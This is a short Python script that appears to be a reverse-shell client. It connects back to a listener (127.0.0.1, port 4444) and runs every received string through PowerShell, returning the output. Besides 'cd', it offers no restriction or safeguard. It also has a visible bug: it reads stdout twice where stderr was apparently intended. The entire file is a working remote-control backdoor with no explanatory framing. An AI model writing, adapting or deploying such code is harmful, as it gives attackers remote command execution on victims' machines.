import socket   
import os
import subprocess
import sys

def run_client():
    host = "127.0.0.1"
    port = 4444
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect((host, port))

    while True:
        buf = c.recv(1024).decode()
        if buf[:2] == 'cd':
            os.chdir(buf[3:])
            c.send(b"Location changed")
        elif len(buf) > 0:
            resp = b""
            cmd = subprocess.Popen(["powershell.exe", buf[:]], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            resp += cmd.stdout.read()
            resp += cmd.stdout.read()
            c.send(resp)